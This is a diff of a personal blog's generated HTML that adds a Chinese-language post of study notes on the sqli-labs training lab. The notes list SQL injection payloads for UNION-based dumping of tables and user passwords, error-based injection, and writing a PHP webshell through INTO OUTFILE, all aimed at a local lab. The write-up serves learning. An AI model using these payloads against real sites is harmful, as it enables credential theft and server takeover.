@@ -15,15 +15,16 @@
 
 
 
-<meta name="description" content="做题却也不如你">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Isron">
-<meta property="og:url" content="https://clearloveqaq.github.io/archives/2016/index.html">
+<meta name="description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs学习笔记总结">
+<meta property="og:url" content="https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/index.html">
 <meta property="og:site_name" content="Isron">
-<meta property="og:description" content="做题却也不如你">
+<meta property="og:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
+<meta property="og:updated_time" content="2016-10-25T14:02:42.079Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Isron">
-<meta name="twitter:description" content="做题却也不如你">
+<meta name="twitter:title" content="sqli-labs学习笔记总结">
+<meta name="twitter:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -55,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Archives: 2016 | Isron</title>
+<title>sqli-labs学习笔记总结 | Isron</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -65,8 +66,8 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
-        isArchive: true,
+        isPost: true,
+        isArchive: false,
         isTag: false,
         isCategory: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
@@ -267,192 +268,215 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-sqli-labs学习笔记总结" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2016/10/25/sqli-labs学习笔记总结/" class="archive-article-date">
-      <time datetime="2016-10-25T13:42:36.000Z" itemprop="datePublished">10-25</time>
+    <div class="article-meta">
+      <a href="/2016/10/25/sqli-labs学习笔记总结/" class="article-date">
+      <time datetime="2016-10-25T13:42:36.000Z" itemprop="datePublished">2016-10-25</time>
 </a>
 
 
-        </div>
-         
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a>
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs学习笔记总结
     </h1>
   
 
-        <div class="article-info info-on-archive">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 
-          
+        
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li></ul>
     </div>
 
-        </div>
         <div class="clearfix"></div>
-    </header>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧<br><a id="more"></a></p>
+<h2 id="Sqli-less-1-2-3，4"><a href="#Sqli-less-1-2-3，4" class="headerlink" title="Sqli-less-1,2,3，4"></a>Sqli-less-1,2,3，4</h2><p>因为1，2,3,4都差不多就放一起说了<br>Mysql 常用指令:</p>
+<pre><code>Show databases; 显示数据库名
+Show tables; 显示表名    
+Desc table； 查看表的信息
+select * from table_name：查看该表里的所有内容
+</code></pre><p>一些sql命令:</p>
+<pre><code>order by :用于对结果集进行排序 在sql注入里通常查看有多少字段
+select ：语句用于从表中选取数据 
+union select ：用于合并两个或多个select 语句的结果集 在sql注入里表示联合查询
+concat ：返回字符串连接的结果
+通过information_schema查看security的内容： select table_name from information_schema.tables where table_schema=&apos;security&apos;; Where 是查询条件
+</code></pre><p>主要payload：<br>爆表名：</p>
+<pre><code>http://127.0.0.1/Less-4/?id=1&quot;) union select 1,table_name,3 from information_schema.tables where table_schema=&apos;security&apos;limit 1,1--+
+</code></pre><p>爆出全部表名：</p>
+<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+ //利用group_concat函数直接输出全部表名
+</code></pre><p>爆列名：</p>
+<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+
+</code></pre><p>爆内容：</p>
+<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(username,password),3 from users--+ 
+</code></pre><h2 id="Sqli-less-5，6"><a href="#Sqli-less-5，6" class="headerlink" title="Sqli-less-5，6"></a>Sqli-less-5，6</h2><p>基于错误的注入：</p>
+<pre><code>rand()获得一个0-1的随机数
+floor 向下取整
+group by 排序
+count() 统计
+</code></pre><p>主要payload：</p>
+<pre><code>http://127.0.0.1/Less-5/?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+</code></pre><p>利用Extractvalue函数报错：</p>
+<pre><code>http://127.0.0.1/Less-5/?id=1&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e)) --+
+</code></pre><p>利用Updatexm函数报错：</p>
+<pre><code>http://127.0.0.1/Less-5/?id=1&apos;  and (updatexml(1,concat(0x3a,(select database())),1))--+
+</code></pre><h2 id="sqli-less-7"><a href="#sqli-less-7" class="headerlink" title="sqli-less-7"></a>sqli-less-7</h2><p>利用注入去写入文件，在知道绝对路径的情况下可以写入一句话木马<br>outfile函数：</p>
+<pre><code>select into outfile //将表的内容导出为一个文本文件 
+select [列名] from table [where 语句]
+into outfile ‘目标文件’ [option];
+</code></pre><p>dumpfile函数 将表的内容导出一行</p>
+<pre><code>select * from users limit 0,1 into dumpfile &apos;c:/2.txt&apos;;
+</code></pre><p>load_file函数 将数据导入mysql</p>
+<pre><code>select load_file (&apos;c:/1.txt&apos;)
+</code></pre><p>读写权限测试：</p>
+<pre><code>and (select count(*)from mysql.user)&gt;0 --+ //如果返回正常则有读写权限
+</code></pre><p>主要payload：</p>
+<pre><code>http://127.0.0.1/Less-7/?id=1&apos;))union select 1,2,3 into outfile &apos;D:/wamp/www/Less-7/1.txt&apos; --+  //在绝对路径生成一个1.txt文件
+http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/www/Less-7/1.jpg&apos;),3 into outfile &apos;D:/wamp/www/Less-7/1.php&apos; --+  //将一句话木马上传到网站目录上
+</code></pre><h2 id="sqli-less-8，9"><a href="#sqli-less-8，9" class="headerlink" title="sqli-less-8，9"></a>sqli-less-8，9</h2><p>盲注<a href="https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="SQL盲注">https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+
+      
+    </div>
+    
   </div>
-</article>
   
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2016/10/21/极客大挑战/" class="archive-article-date">
-      <time datetime="2016-10-21T02:32:23.000Z" itemprop="datePublished">10-21</time>
-</a>
-
-
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/10/21/极客大挑战/">极客大挑战</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
+        <p><span>发布时间:</span>2016-10-25, 21:42:36</p>
+        <p><span>最后更新:</span>2016-10-25, 22:02:42</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/10/25/sqli-labs学习笔记总结/" title="sqli-labs学习笔记总结">https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2016/10/16/sqlmap常见使用语法/" class="archive-article-date">
-      <time datetime="2016-10-16T11:43:02.000Z" itemprop="datePublished">10-16</time>
-</a>
 
 
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/10/16/sqlmap常见使用语法/">sqlmap常见使用语法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li></ul>
-    </div>
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-w">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2016/10/15/sql绕过技巧/" class="archive-article-date">
-      <time datetime="2016-10-15T06:30:51.000Z" itemprop="datePublished">10-15</time>
-</a>
-
-
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/10/15/sql绕过技巧/">sql绕过技巧</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WAF/">WAF</a></li></ul>
-    </div>
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2016/09/22/sql盲注学习笔记/" class="archive-article-date">
-      <time datetime="2016-09-22T01:52:17.000Z" itemprop="datePublished">09-22</time>
-</a>
-
-
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/09/22/sql盲注学习笔记/">sql盲注学习笔记</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li></ul>
-    </div>
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2016/page/2/">2</a><a class="extend next" rel="next" href="/archives/2016/page/2/">Next &raquo;</a>
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/10/21/极客大挑战/">
+                    极客大挑战
+                </a>
+            </div>
+        
     </nav>
-  
 
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-1-2-3，4"><span class="toc-number">1.</span> <span class="toc-text">Sqli-less-1,2,3，4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-5，6"><span class="toc-number">2.</span> <span class="toc-text">Sqli-less-5，6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-7"><span class="toc-number">3.</span> <span class="toc-text">sqli-less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-8，9"><span class="toc-number">4.</span> <span class="toc-text">sqli-less-8，9</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/10/25/sqli-labs学习笔记总结/" data-title="sqli-labs学习笔记总结" data-url="https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"clearloveqaq"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/10/21/极客大挑战/" title="下一篇: 极客大挑战">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/21/极客大挑战/">极客大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/sqlmap常见使用语法/">sqlmap常见使用语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/15/sql绕过技巧/">sql绕过技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/22/sql盲注学习笔记/">sql盲注学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/12/drops安全杂项/">drops安全杂项</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/drops-php-write-up/">drops-php write up</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
